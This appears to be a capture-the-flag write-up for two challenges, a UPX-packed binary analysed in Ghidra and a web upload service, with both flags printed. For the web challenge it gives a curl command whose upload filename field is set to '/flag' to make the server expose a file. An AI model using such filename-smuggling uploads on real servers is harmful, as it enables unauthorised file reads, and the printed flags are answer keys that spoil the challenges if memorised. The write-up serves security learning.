# what's UP, X! 200
#### something funny about the question title..

### File - [upx](https://github.com/gamer-1478/unreal-ctf/blob/main/upx)

decoding it with upx was really challenging for a while. I had to go to a windows system and download the latest release for windows. 

using ``upx -d upx`` on the file we get a binary of upx

![image](https://github.com/gamer-1478/unreal-ctf/assets/74775129/6669533e-e0a0-41d4-94f2-aa202d908466)

opening the binary in gidhra

![image](https://github.com/gamer-1478/unreal-ctf/assets/74775129/81ff5646-27ec-41b2-b9d8-e810f89c43b1)

we see that the fav number is clearly in text given as 6942

entering it to the binary we get the flag. 

```
flag - unreal{haha_funny_number}
```

# sec-web 250
#### yes another one, go http://195.154.231.70:5341

[sec-web.zip](https://github.com/gamer-1478/unreal-ctf/blob/main/sec.zip)

found a writeup for this challenge - https://iwanflagz.github.io/RaRCTF-2021-writeups/web/secureuploader.html

following it, my sol was

```bash
curl -v -L -F "file=@shop;filename=/flag" http://195.154.231.70:5341/upload
```
shop can be changed for any file avaiable on your desktop. 

which gives the flag 
``` 
Flag - unreal{m07h3rfuck1n6_j01n}
``` 